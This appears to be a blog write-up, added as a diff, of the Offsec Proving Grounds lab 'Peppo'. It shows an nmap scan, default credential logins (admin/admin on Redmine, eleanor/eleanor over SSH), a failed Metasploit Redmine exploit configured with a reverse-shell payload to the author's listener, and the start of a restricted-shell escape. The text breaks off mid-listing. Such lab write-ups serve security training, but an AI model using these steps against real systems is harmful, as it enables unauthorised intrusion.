@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang="en-us"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Writeup - Offsec PG Peppo | kei5uke&#39;s Hacking Note</title>
+<meta property="og:title" content="Writeup - Offsec PG Peppo | kei5uke&#39;s Hacking Note" />
+<meta name="twitter:title" content="Writeup - Offsec PG Peppo | kei5uke&#39;s Hacking Note" />
+<meta itemprop="name" content="Writeup - Offsec PG Peppo | kei5uke&#39;s Hacking Note" />
+<meta name="application-name" content="Writeup - Offsec PG Peppo | kei5uke&#39;s Hacking Note" />
+<meta property="og:site_name" content="kei5uke&#39;s Hacking Note" />
+
+<meta name="description" content="Writeup for PG Peppo">
+<meta itemprop="description" content="Writeup for PG Peppo" />
+<meta property="og:description" content="Writeup for PG Peppo" />
+<meta name="twitter:description" content="Writeup for PG Peppo" />
+
+<meta property="og:locale" content="en-us" />
+<meta name="language" content="en-us" />
+
+
+
+  <meta itemprop="image" content="" />
+  <meta property="og:image" content="" />
+  <meta name="twitter:image" content="" />
+  <meta name="twitter:image:src" content="" />
+
+
+
+
+    
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2023-10-18T00:00:00Z />
+    <meta property="article:published_time" content=2023-10-18T00:00:00Z />
+
+    
+    <meta property="og:article:author" content="Kei5uke" />
+    <meta property="article:author" content="Kei5uke" />
+    <meta name="author" content="Kei5uke" />
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "Writeup - Offsec PG Peppo",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2023-10-18",
+        "description": "Writeup for PG Peppo",
+        "wordCount":  961 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2023-10-18",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "kei5uke\u0027s Hacking Note"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.118.2">
+
+    
+
+    <link rel="canonical" href="/posts/peppo/">
+    <link href="/style.min.9bd04d0fad85388343088ec85e9afd787ea003e72914d7f57df39c17ab2e7173.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    </head>
+<body data-theme = "auto" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/pages/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Writeup - Offsec PG Peppo</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2023-10-18T00:00:00&#43;00:00" itemprop="datePublished"> 18 Oct 2023 </time>
+                </div>
+                
+            </header>
+                <details class="toc">
+                    <summary><b>Table of Contents</b></summary>
+                    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#peppo">Peppo</a></li>
+    <li><a href="#nmap-enumration">Nmap Enumration</a></li>
+    <li><a href="#http-8080---redmine">HTTP 8080 - Redmine</a></li>
+    <li><a href="#ssh">SSH</a></li>
+    <li><a href="#getting-out-of-restricted-shell">Getting out of Restricted Shell</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#root">Root</a></li>
+    <li><a href="#summary">Summary</a></li>
+  </ul>
+</nav>
+                </details>
+                <div class="page-content">
+                <h1 id="peppo">Peppo</h1>
+<h1 id="nmap-enumration">Nmap Enumration</h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Nmap 7.94 scan initiated Tue Oct 17 10:21:56 2023 as: nmap -sC -sV -p- -T4 -oN nmap.txt 192.168.239.60</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.239.60
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.044s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65529</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT      STATE  SERVICE           VERSION
+</span></span><span class="line"><span class="cl">22/tcp    open   ssh               OpenSSH 7.4p1 Debian 10+deb9u7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_auth-owners: root
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 75:4c:02:01:fa:1e:9f:cc:e4:7b:52:fe:ba:36:85:a9 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> b7:6f:9c:2b:bf:fb:04:62:f4:18:c9:38:f4:3d:6b:2b <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 98:7f:b6:40:ce:bb:b5:57:d5:d1:3c:65:72:74:87:c3 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">53/tcp    closed domain
+</span></span><span class="line"><span class="cl">113/tcp   open   ident             FreeBSD identd
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_auth-owners: nobody
+</span></span><span class="line"><span class="cl">5432/tcp  open   postgresql        PostgreSQL DB 12.3 - 12.4
+</span></span><span class="line"><span class="cl">8080/tcp  open   http              WEBrick httpd 1.4.2 <span class="o">(</span>Ruby 2.6.6 <span class="o">(</span>2020-03-31<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-robots.txt: <span class="m">4</span> disallowed entries 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_/issues/gantt /issues/calendar /activity /search
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: WEBrick/1.4.2 <span class="o">(</span>Ruby/2.6.6/2020-03-31<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Redmine
+</span></span><span class="line"><span class="cl">10000/tcp open   snet-sensor-mgmt?
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">400</span> Bad Request
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   FourOhFourRequest: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/plain
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Tue, <span class="m">17</span> Oct <span class="m">2023</span> 07:24:12 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Hello World
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   GetRequest, HTTPOptions: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/plain
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Tue, <span class="m">17</span> Oct <span class="m">2023</span> 07:24:06 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Hello World
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_auth-owners: eleanor
+</span></span><span class="line"><span class="cl"><span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span class="line"><span class="cl">SF-Port10000-TCP:V<span class="o">=</span>7.94%I<span class="o">=</span>7%D<span class="o">=</span>10/17%Time<span class="o">=</span>652E3696%P<span class="o">=</span>aarch64-unknown-linux-
+</span></span><span class="line"><span class="cl">SF:gnu%r<span class="o">(</span>GetRequest,71,<span class="s2">&#34;HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/pl
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ain\r\nDate:\x20Tue,\x2017\x20Oct\x202023\x2007:24:06\x20GMT\r\nConnect
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ion:\x20close\r\n\r\nHello\x20World\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>HTTPOptions,71,<span class="s2">&#34;HTTP/1\.1\x20
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:200\x20OK\r\nContent-Type:\x20text/plain\r\nDate:\x20Tue,\x2017\x20Oct\
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:x202023\x2007:24:06\x20GMT\r\nConnection:\x20close\r\n\r\nHello\x20Worl
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:d\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>RTSPRequest,2F,<span class="s2">&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnectio
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:n:\x20close\r\n\r\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>RPCCheck,2F,<span class="s2">&#34;HTTP/1\.1\x20400\x20Bad\x20Request
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:\r\nConnection:\x20close\r\n\r\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>DNSVersionBindReqTCP,2F,<span class="s2">&#34;HTTP/1\.1
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>DNSStatus
+</span></span><span class="line"><span class="cl">SF:RequestTCP,2F,<span class="s2">&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20clo
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:se\r\n\r\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>Help,2F,<span class="s2">&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnectio
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:n:\x20close\r\n\r\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>SSLSessionReq,2F,<span class="s2">&#34;HTTP/1\.1\x20400\x20Bad\x20Re
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:quest\r\nConnection:\x20close\r\n\r\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>TerminalServerCookie,2F,<span class="s2">&#34;HTTP
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>TLSS
+</span></span><span class="line"><span class="cl">SF:essionReq,2F,<span class="s2">&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20clos
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:e\r\n\r\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>Kerberos,2F,<span class="s2">&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnec
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:tion:\x20close\r\n\r\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>SMBProgNeg,2F,<span class="s2">&#34;HTTP/1\.1\x20400\x20Bad\x20Re
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:quest\r\nConnection:\x20close\r\n\r\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>X11Probe,2F,<span class="s2">&#34;HTTP/1\.1\x20400
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>FourOhFourReques
+</span></span><span class="line"><span class="cl">SF:t,71,<span class="s2">&#34;HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plain\r\nDate:\x2
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:0Tue,\x2017\x20Oct\x202023\x2007:24:12\x20GMT\r\nConnection:\x20close\r
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:\n\r\nHello\x20World\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>LPDString,2F,<span class="s2">&#34;HTTP/1\.1\x20400\x20Bad\x20Req
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:uest\r\nConnection:\x20close\r\n\r\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>LDAPSearchReq,2F,<span class="s2">&#34;HTTP/1\.1\x2
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>LDAPBindReq,
+</span></span><span class="line"><span class="cl">SF:2F,<span class="s2">&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n&#34;</span>
+</span></span><span class="line"><span class="cl">SF:<span class="o">)</span>%r<span class="o">(</span>SIPOptions,2F,<span class="s2">&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:0close\r\n\r\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>LANDesk-RC,2F,<span class="s2">&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:nConnection:\x20close\r\n\r\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>TerminalServer,2F,<span class="s2">&#34;HTTP/1\.1\x20400\x
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:20Bad\x20Request\r\nConnection:\x20close\r\n\r\n&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">Service Info: OSs: Linux, FreeBSD<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel, cpe:/o:freebsd:freebsd
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl"><span class="c1"># Nmap done at Tue Oct 17 10:24:44 2023 -- 1 IP address (1 host up) scanned in 167.59 seconds</span>
+</span></span></code></pre></div><p>I can see some user names such as nobody, eleanor, root</p>
+<h1 id="http-8080---redmine">HTTP 8080 - Redmine</h1>
+<p><img src="Peppo%203686053f39664308a95784e6e3c84088/Screenshot_2023-10-18_at_10.24.42.png" alt="Screenshot 2023-10-18 at 10.24.42.png"></p>
+<p><img src="Peppo%203686053f39664308a95784e6e3c84088/Screenshot_2023-10-18_at_10.25.20.png" alt="Screenshot 2023-10-18 at 10.25.20.png"></p>
+<p>The Redmine page allows you login as admin with a password “admin” however I couldn’t find anything useful here.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>unix/webapp/redmine_scm_exec<span class="o">)</span> &gt; show options
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Module options <span class="o">(</span>exploit/unix/webapp/redmine_scm_exec<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Name     Current Setting  Required  Description
+</span></span><span class="line"><span class="cl">   ----     ---------------  --------  -----------
+</span></span><span class="line"><span class="cl">   Proxies                   no        A proxy chain of format type:host:port<span class="o">[</span>,type:host:port<span class="o">][</span>...<span class="o">]</span>
+</span></span><span class="line"><span class="cl">   RHOSTS                    yes       The target host<span class="o">(</span>s<span class="o">)</span>, see https://github.com/rapid7/metasploit-framework/wiki/Using-Me
+</span></span><span class="line"><span class="cl">                                       tasploit
+</span></span><span class="line"><span class="cl">   RPORT    <span class="m">80</span>               yes       The target port <span class="o">(</span>TCP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   SSL      <span class="nb">false</span>            no        Negotiate SSL/TLS <span class="k">for</span> outgoing connections
+</span></span><span class="line"><span class="cl">   URI      /projects/1/     yes       The full URI path to the project
+</span></span><span class="line"><span class="cl">   VHOST                     no        HTTP server virtual host
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Payload options <span class="o">(</span>cmd/unix/reverse<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Name   Current Setting  Required  Description
+</span></span><span class="line"><span class="cl">   ----   ---------------  --------  -----------
+</span></span><span class="line"><span class="cl">   LHOST  10.211.55.20     yes       The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   LPORT  <span class="m">4444</span>             yes       The listen port
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Exploit target:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Id  Name
+</span></span><span class="line"><span class="cl">   --  ----
+</span></span><span class="line"><span class="cl">   <span class="m">0</span>   Automatic
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>unix/webapp/redmine_scm_exec<span class="o">)</span> &gt; <span class="nb">set</span> LSHOT 192.168.45.240
+</span></span><span class="line"><span class="cl"><span class="nv">LSHOT</span> <span class="o">=</span>&gt; 192.168.45.240
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>unix/webapp/redmine_scm_exec<span class="o">)</span> &gt; <span class="nb">set</span> RHOST 192.168.239.60
+</span></span><span class="line"><span class="cl"><span class="nv">RHOST</span> <span class="o">=</span>&gt; 192.168.239.60
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>unix/webapp/redmine_scm_exec<span class="o">)</span> &gt; <span class="nb">set</span> RPORT <span class="m">8080</span>
+</span></span><span class="line"><span class="cl"><span class="nv">RPORT</span> <span class="o">=</span>&gt; <span class="m">8080</span>
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>unix/webapp/redmine_scm_exec<span class="o">)</span> &gt; run
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP double handler on 10.211.55.20:4444 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> The server returned: <span class="m">404</span> Not Found 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Exploit completed, but no session was created.
+</span></span></code></pre></div><p>I tried redmine vulnerability that I found, however this does not work.</p>
+<h1 id="ssh">SSH</h1>
+<p>I decided to check the hint on offsec website and it says that useable username should be found in nmap enumeration.</p>
+<p>It turned out that you can ssh the user “eleanor” with the password “eleanor”.</p>
+<h1 id="getting-out-of-restricted-shell">Getting out of Restricted Shell</h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">eleanor@peppo:~$ <span class="nb">compgen</span> -c
+</span></span><span class="line"><span class="cl"><span class="k">if</span>
+</span></span><span class="line"><span class="cl"><span class="k">then</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl"><span class="k">elif</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="cl"><span class="k">case</span>
+</span></span><span class="line"><span class="cl"><span class="k">esac</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span>
+</span></span><span class="line"><span class="cl"><span class="k">select</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span>
+</span></span><span class="line"><span class="cl"><span class="k">until</span>
+</span></span><span class="line"><span class="cl"><span class="k">do</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span><span class="line"><span class="cl">in
+</span></span><span class="line"><span class="cl"><span class="k">function</span>
+</span></span><span class="line"><span class="cl"><span class="nb">time</span>
+</span></span><span class="line"><span class="cl"><span class="o">{</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">!
+</span></span><span class="line"><span class="cl"><span class="o">[[</span>
+</span></span><span class="line"><span class="cl"><span class="o">]]</span>
+</span></span><span class="line"><span class="cl">coproc
+</span></span><span class="line"><span class="cl">__expand_tilde_by_ref
+</span></span><span class="line"><span class="cl">__get_cword_at_cursor_by_ref
+</span></span><span class="line"><span class="cl">__git_eread
+</span></span><span class="line"><span class="cl">__git_ps1
+</span></span><span class="line"><span class="cl">__git_ps1_colorize_gitstring
+</span></span><span class="line"><span class="cl">__git_ps1_show_upstream
+</span></span><span class="line"><span class="cl">__grub_dir
+</span></span><span class="line"><span class="cl">__grub_get_last_option
+</span></span><span class="line"><span class="cl">__grub_get_options_from_help
+</span></span><span class="line"><span class="cl">__grub_get_options_from_usage
+</span></span><span class="line"><span class="cl">__grub_list_menuentries
+</span></span><span class="line"><span class="cl">__grub_list_modules
+</span></span><span class="line"><span class="cl">__grubcomp
+</span></span><span class="line"><span class="cl">__ltrim_colon_completions
+</span></span><span class="line"><span class="cl">__parse_options
+</span></span><span class="line"><span class="cl">__reassemble_comp_words_by_ref
+</span></span><span class="line"><span class="cl">_allowed_groups
+</span></span><span class="line"><span class="cl">_allowed_users
+</span></span><span class="line"><span class="cl">_available_interfaces
+</span></span><span class="line"><span class="cl">_cd
+</span></span><span class="line"><span class="cl">_cd_devices
+</span></span><span class="line"><span class="cl">_command
+</span></span><span class="line"><span class="cl">_command_offset
+</span></span><span class="line"><span class="cl">_complete_as_root
+</span></span><span class="line"><span class="cl">_completion_loader
+</span></span><span class="line"><span class="cl">_configured_interfaces
+</span></span><span class="line"><span class="cl">_count_args
+</span></span><span class="line"><span class="cl">_dkms
+</span></span><span class="line"><span class="cl">_dvd_devices
+</span></span><span class="line"><span class="cl">_expand
+</span></span><span class="line"><span class="cl">_filedir
+</span></span><span class="line"><span class="cl">_filedir_xspec
+</span></span><span class="line"><span class="cl">_filename_parts
+</span></span><span class="line"><span class="cl">_fstypes
+</span></span><span class="line"><span class="cl">_get_comp_words_by_ref
+</span></span><span class="line"><span class="cl">_get_cword
+</span></span><span class="line"><span class="cl">_get_first_arg
+</span></span><span class="line"><span class="cl">_get_pword
+</span></span><span class="line"><span class="cl">_gids
+</span></span><span class="line"><span class="cl">_grub_editenv
+</span></span><span class="line"><span class="cl">_grub_install
+</span></span><span class="line"><span class="cl">_grub_mkconfig
+</span></span><span class="line"><span class="cl">_grub_mkfont
+</span></span><span class="line"><span class="cl">_grub_mkimage
+</span></span><span class="line"><span class="cl">_grub_mkpasswd_pbkdf2
+</span></span><span class="line"><span class="cl">_grub_mkrescue
+</span></span><span class="line"><span class="cl">_grub_probe
+</span></span><span class="line"><span class="cl">_grub_script_check
+</span></span><span class="line"><span class="cl">_grub_set_entry
+</span></span><span class="line"><span class="cl">_grub_setup
+</span></span><span class="line"><span class="cl">_have
+</span></span><span class="line"><span class="cl">_init_completion
+</span></span><span class="line"><span class="cl">_installed_modules
+</span></span><span class="line"><span class="cl">_ip_addresses
+</span></span><span class="line"><span class="cl">_kernel_versions
+</span></span><span class="line"><span class="cl">_kernels
+</span></span><span class="line"><span class="cl">_known_hosts
+</span></span><span class="line"><span class="cl">_known_hosts_real
+</span></span><span class="line"><span class="cl">_longopt
+</span></span><span class="line"><span class="cl">_mac_addresses
+</span></span><span class="line"><span class="cl">_minimal
+</span></span><span class="line"><span class="cl">_modules
+</span></span><span class="line"><span class="cl">_ncpus
+</span></span><span class="line"><span class="cl">_parse_help
+</span></span><span class="line"><span class="cl">_parse_usage
+</span></span><span class="line"><span class="cl">_pci_ids
+</span></span><span class="line"><span class="cl">_pgids
+</span></span><span class="line"><span class="cl">_pids
+</span></span><span class="line"><span class="cl">_pnames
+</span></span><span class="line"><span class="cl">_quote_readline_by_ref
+</span></span><span class="line"><span class="cl">_realcommand
+</span></span><span class="line"><span class="cl">_rl_enabled
+</span></span><span class="line"><span class="cl">_root_command
+</span></span><span class="line"><span class="cl">_service
+</span></span><span class="line"><span class="cl">_services
+</span></span><span class="line"><span class="cl">_shells
+</span></span><span class="line"><span class="cl">_signals
+</span></span><span class="line"><span class="cl">_split_longopt
+</span></span><span class="line"><span class="cl">_subdirectories
+</span></span><span class="line"><span class="cl">_sysvdirs
+</span></span><span class="line"><span class="cl">_terms
